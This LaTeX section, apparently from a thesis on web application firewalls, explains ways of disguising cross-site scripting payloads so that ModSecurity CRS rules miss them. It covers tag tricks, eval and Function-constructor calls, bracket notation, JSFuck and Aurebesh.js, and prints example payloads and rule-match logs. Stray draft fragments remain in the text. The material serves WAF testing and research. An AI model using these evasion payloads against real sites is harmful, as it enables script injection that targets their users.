\subsection{XSS Payloads}
\label{sec:xsstech}
This section lists evasion techniques applicable to \gls{xss} payloads.

\subsubsection{Tag modification}
In a case, where regex filters are configured to look for html tags, modifying html tags might make a payload evade the filter. Possible modifications include:
\begin{itemize}
	\item prepending the tag with an additional \verb|<|: \verb|<<script>alert('XSS')</script>|
	\item omitting the closing tag: \verb|<script>alert('XSS')|
	\item using double open angle brackets: \verb|<iframe src=javascript:alert('XSS') <|
	\item using uncommon tags: \\ \verb|<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE>|
\end{itemize}
Technique by \cite{medium/allypetitt}

\subsubsection{Space replace}
A regex filter that is expecting a space inside a html tag at certain positions can be evaded by replacing the space with a \verb|/|.
For instance, \verb|<img src="1" onerror="alert('XSS')">| becomes \verb|<img/src="1"/onerror="alert('XSS')">|.

	\end{itemize}

\subsubsection{Tagged Template Literals}
\label{sec:taggedtemplateliterals}
Tagged Template Literals can be used in JavaScript payloads to avoid detection of JavaScript function calls in an http request. Dr. Alex Rauschmeyer explains Tagged Template Literals in ``Exploring ES6'':
\begin{quotation} Tagged Template Literals are function calls whose parameters are provided via template literals. [...]
	The following is a tagged template literal (short: tagged template):
	\begin{lstlisting}
tagFunction`Hello ${firstName} ${lastName}!`
\end{lstlisting}
	Putting a template literal after an expression triggers a function call, similar to how a parameter list (comma-separated values in parentheses) triggers a function call. The previous code is equivalent to the following function call (in reality, first parameter is more than just an Array, but that is explained later).
	\begin{lstlisting}
tagFunction(['Hello ', ' ', '!'], firstName, lastName)
\end{lstlisting}
	Thus, the name before the content in backticks is the name of a function to call, the tag function.
	\cite{exploringes6/templatelit}
\end{quotation}

As the function \verb|alert| can be called with an array as first parameter, it is possible to substitute the payload with \verb|alert`XSS`|. The substitute payload might evade regex filtering that looks for a function name followed by an opening \verb|(|.
Technique by \cite{onecons/wafbypass}.


\subsubsection{eval() function}
\label{sec:eval}

JavaScript payloads that are being passed in string format can be executed using the eval function. The \verb|eval()| function will evaluate the source string given as an argument and return its completion value. \cite{js/eval}
A possible usecase for \verb|eval()| in the quest to bypass a \gls{waf} is the splitting of function names that would cause a HTTP request to get rejected by the firewall.
Looking at Listing~\ref{lst:alertXSSblocked}, it is clear that the function call \verb|alert('XSS')| is being blocked by the ModSecurity firewall using CRS 4.1.0.
To avoid a match on \verb|alert(|, it is possible to split the function call into parts \verb|al|, \verb|e| and \verb|rt('XSS')| by using string concatenation in the form of \verb|`al` + `e` + `rt('XSS')`|.
Sending the payload in this form will not cause the the desired effect, as a JavaScript interpreter will interpret the payload as a string instead of a function call to the \verb|alert()| function.
Using the \verb|eval()| function in combination with the splitted string solves this problem. Passing the string \verb|`al` + `e` + `rt('XSS')`| in the form of \verb|eval(`al` + `e` + `rt('XSS')`)| as an argument to the \verb|eval()| function will cause the string to be evaluated and interpreted. Technique inspired by \cite{onecons/wafbypass}.
The ModSecurity firewall using CRS 4.1.0. checks for usage of the function \verb|eval()| and tries to block requests containing it. An example is listed in Listing~\ref{lst:evalalertXSSblocked}.

\begin{lstlisting}[style=ruleStyle, language=XML, caption=eval(`al` + `e` + `rt('XSS')`) blocking example, label={lst:evalalertXSSblocked}]
<payload>eval(`al` + `e` + `rt('XSS')`)</payload>
<file>"rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf"</file>
<fileDetails>[line "331"] [id "933160"]<fileDetails>
<MatchedData>"eval(`al`   `e`   `rt('XSS')"</MatchedData>

<file>"rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"</file>
<fileDetails>[line "52"] [id "934100"]<fileDetails>
<MatchedData>"eval("</MatchedData>

<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"eval("</MatchedData>
\end{lstlisting}

\subsubsection{function constructor}
\label{sec:functionconstructor}

When using the function \verb|eval()| (see Section~\ref{sec:eval}) causes a request to be blocked, a substitute in the form of \verb|[].constructor.constructor(`alert('XSS')`)()| is available in JavaScript.

Calling \verb|[]| will create an empty array, which is a special kind of object.
Any kind of object in JavaScript, with the exception of null prototype objects, will have a constructor property on its prototype. \cite{js/object}

The Array objects constructor can be accessed by calling \verb|.constructor| on an instance of Array, like \verb|[].constructor|. \cite{js/array}
Constructors are technically regular functions. \cite{js/constructor}
As such, they are Function objects. Function objects have a constructor themselfes, which again is called using the \verb|.constructor| notation.

Using \verb|[].constructor.constructor| will yield access to the Function() constructor.
Calling the Function() constructor directly can create functions dynamically, similar to using \verb|eval()|.
The difference being that the Function() constructor creates functions that execute in the global scope only.

The Function() constructor takes a variable count of arguments. The first $n - 1$ arguments are the \quotes{names to be used by the function as formal argument names. Each must be a string that corresponds to a valid JavaScript parameter [...]} \cite{js/function}
The last argument given to the Function() constructor is expected to be a string containing the JavaScript statements compromising the function definition. \cite{js/function}

Therefore, the afromentioned substitute for \verb|eval()| - \\ \verb|[].constructor.constructor(`alert('XSS')`)()| - \\ will create a function with the function body \verb|alert('XSS')| and call it directly.
In other words: It will call a function that calls \verb|alert('XSS')|.
Technique by \cite{onecons/wafbypass}.

A more straightforward and less obscure way of accessing the Function() contructor is to call it directly:
\begin{quote}
	\verb|Function()| can be called with or without \verb|new|. Both create a new \verb|Function| instance. \cite{js/function}
\end{quote}
Depending on the firewall configuration, a WAF might use regex filtering to detect usage of \verb|Function()|.
In this case, accessing the Function() constructor via an array object can be an alternative.

\\ CAN USE ANY FUNCTION (MAP, FILTER, JOIN, CONSTRUCTOR...)}

\subsubsection{square bracket notation}
JavaScript provides a \quotes{square bracket notation} to access properties of an Object. It is used to access multiword properties as well as provide a way of obtaining property names as the result of an expression. \cite{js/brackets}

This \quotes{square bracket notation} allows to substitute the dot notation in a case where using the dot notation is not feasible or blocked by firewall rules.
For instance, in a payload composed using the function constructor as stated in \ref{sec:functionconstructor}, the part \\ \verb|[].constructor.constructor(`alert('XSS')`)()| can be substituted with \\ \verb|[][`constructor`][`constructor`](`alert('XSS')`)()|.


\subsubsection{string replace}
\label{sec:stringreplace}
When passing certain characters is not feasible, there is a chance they can be substituted in a string replacement strategy using the \verb|+| operator.
A part of the description of the \verb|+| operator in JavaScript states:
\begin{quote}
	The + operator is overloaded for two distinct operations: numeric addition and string concatenation. When evaluating, it first coerces both operands to primitives. ... \cite{js/+}
\end{quote}
In the process of primitive coercion, objects are converted to primitives by calling their \verb|[@@toPrimitive]()|, \verb|valueOf()| and \verb|toString()| methods in the given order. Date and Symbol objects are the only built-in objects that override the \verb|[@@toPrimitive]()| method.
Objects without an override for the \verb|[@@toPrimitive]()| method inherit \verb|valueOf| from
\\ \verb|Object.prototype.valueOf|, which returns the object itself.
Since the return value is an object, it is ignored and \verb|toString()| is called instead. \cite{js/primitiveCoercion}

In the code \verb|open + []|, \verb|open| is a built-in Function object, \verb|[]| is a built-in Array object.
In the process of primitive coercion, for both, their \verb|toString()| method is being called.
When they are joined by the \verb|+| operator, it results in a String in the form of \verb|open.toString()| concatenated with \verb|[].toString()|. The result is equal to \verb|open.toString()| (see Listing~\ref{lst:opentostring}) as \verb|[].toString()| returns an empty String.

\begin{lstlisting}[style=basicStyle, caption=open.toString() in JavaScript, label={lst:opentostring}]
function open() {
    [native code]
}
\end{lstlisting}

In JavaScript, array-like access to String objects is possible. \cite{js/stringbrackets} For example, \verb|[open+[]][0][13]| returns the character \verb|(|. \verb|[open+[]][0][14]| returns the character \verb|)|. Listing~\ref{lst:opentostringindices} visualizes open.toString() with the corresponding indices.

\begin{lstlisting}[style=basicStyle, caption=open.toString() with indices in JavaScript, label={lst:opentostringindices}]
f u n c t i o n   o p  e  n  (  )     {  \n
0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21

[  n  a  t  i  v  e     c  o  d  e  ]  \n }
22 23 24 25 26 27 28 29 30 31 32 33 34 35 36
\end{lstlisting}


\subsubsection{JSFuck}
JSFuck was created by Martin Kleppe to write any valid JavaScript with only 6 different characters. 6 different characters is close to the possible Minimum, there are suggestions to use only 5 different characters, but they have some preconditions. \cite{mk/five, tc39/pipeline}
Martin Kleppe describes JSFuck as follows:
\begin{quote}
	JSFuck is an esoteric and educational programming style based on the atomic parts of JavaScript. It uses only six different characters to write and execute code.

	It does not depend on a browser, so you can even run it on Node.js. \cite{mk/jsfuck}
\end{quote}
Encoding the payload \verb|alert(1)| in JSFuck results in following payload:
\begin{lstlisting}[style=basicStyle, caption=alert(1) in JSFuck, label={lst:alert1jsfuck}]
  (![] + [])[+!+[]] +
    (![] + [])[!+[] + !+[]] +
    (!![] + [])[!+[] + !+[] + !+[]] +
    (!![] + [])[+!+[]] +
    (!![] + [])[+[]] +
    ([][
      (![] + [])[+[]] +
        (![] + [])[!+[] + !+[]] +
        (![] + [])[+!+[]] +
        (!![] + [])[+[]]
    ] + [])[+!+[] + [!+[] + !+[] + !+[]]] +
    [+!+[]] +
    ([+[]] +
      ![] +
      [][
        (![] + [])[+[]] +
          (![] + [])[!+[] + !+[]] +
          (![] + [])[+!+[]] +
          (!![] + [])[+[]]
      ])[!+[] + !+[] + [+[]]],
\end{lstlisting}

This payload is 297 characters long, which is around 37 times more than the 8 characters forming \verb|alert(1)|. On usage of JSFuck, payload size increases dramatically. Encoding the payload \verb|alert('XSS')| already requires 5739 characters (see Listing~\ref{lst:alertxssjsfuck}). If payload size is not limited, a lot of obscuration can be gained by using JSFuck to obscure payloads. The JSFuck website provides an encoder that is ready to use. It supports evaluating the source such that no additional measure is needed to execute the payload. \cite{mk/jsfuck}


\subsubsection{Aurebesh.js}
Similar to JSFuck, Aurebesh.js was created by Martin Kleppe. In its minimalistic form, it allows to write a valid JavaScript function calling \verb|alert(1)| with the characters \verb|() + [] ! " = {}| as well as one other character of choice. Aurebesh.js allows the choice of up to 9 distinct characters or words. In the case where the characters \verb|A B C D E F G H I| are chosen, the system is explained as follows:
\begin{lstlisting}[style=basicStyle, caption=Aurebesh.js explanation \cite{mk/aurebesh}, label={lst:aurebeshexplanation}]
		A = ''              // empty string
		B = !A + A          // "true"
		C = !B + A          // "false"
		D = A + {}          // "[object Object]"
		E = B[A++]          // "t" = "true"[0]
		F = B[G = A]        // "r" = "true"[1]
		H = ++G + A         // 2, 3
		I = D[G + H]        // "c"

		B[
		  I +=              // "c"
		    D[A] +          // "o" = "object"[0]
		    (B.C+D)[A] +    // "n" = "undefined"[1]
		    C[H] +          // "s" = "false"[3]
		    E +             // "t"
		    F +             // "r"
		    B[G] +          // "u" = "true"[2]
		    I +             // "c" = "[object]"[5]
		    E +             // "t"
		    D[A] +          // "o" = "[object]"[1]
		    F               // "r"
		][
		  I                 // "constructor"
		](
		  C[A] +            //  "a"
		  C[G] +            //  "l"
		  B[H] +            //  "e"
		  F +               //  "r"
		  E +               //  "t"
		  "(A)"             // "(1)"
		)()
\end{lstlisting}
If less than 9 characters (or words) are supplied, Aurebesh.js will reuse some characters by concatenating them together to create 9 different variables. \cite{mk/aurebesh}

In contrast to the author who is pursuing the translation of JavaScript into other writing systems, antagonist actors might use this idea to translate \gls{xss} payloads that are blocked by a Web application firewall into \gls{xss} payloads that bypass Web application firewalls. Antagonist actors are not limited to just using 9 variables when crafting \gls{xss} payloads using Aurebesh.js. They can use Aurebesh.js as a base for their payloads while adding more characters and variables as needed.
The obfuscation gained by using Aurebesh.js might make payloads evade detection while the added payload content maliciously influences the Web application.
As a proof of concept, the function \verb|alert| has been substituded with the function \verb|prompt| in the following example:

\begin{lstlisting}[style=basicStyle, caption=Aurebesh.js obfuscation of prompt, label={lst:aurebeshprompt}]
		A = ''              // empty string
		B = !A + A          // "true"
		C = !B + A          // "false"
		D = A + {}          // "[object Object]"
		E = B[A++]          // "t" = "true"[0]
		F = B[G = A]        // "r" = "true"[1]
		H = ++G + A         // 2, 3
		I = D[G + H]        // "c"

		B[
		  I +=              // "c"
		    D[A] +          // "o" = "object"[0]
		    (B.C+D)[A] +    // "n" = "undefined"[1]
		    C[H] +          // "s" = "false"[3]
		    E +             // "t"
		    F +             // "r"
		    B[G] +          // "u" = "true"[2]
		    I +             // "c" = "[object]"[5]
		    E +             // "t"
		    D[A] +          // "o" = "[object]"[1]
		    F               // "r"
		][
		  I                 // "constructor"
		](
		  'p' +             // "p"
		  F +               // "r"
		  D[A] +            // "o"
		  'm' +             // "m"
		  'p' +             // "p"
		  E +               // "t"
		  '(A,++A)'         // "(1,2)"
		)()
\end{lstlisting}
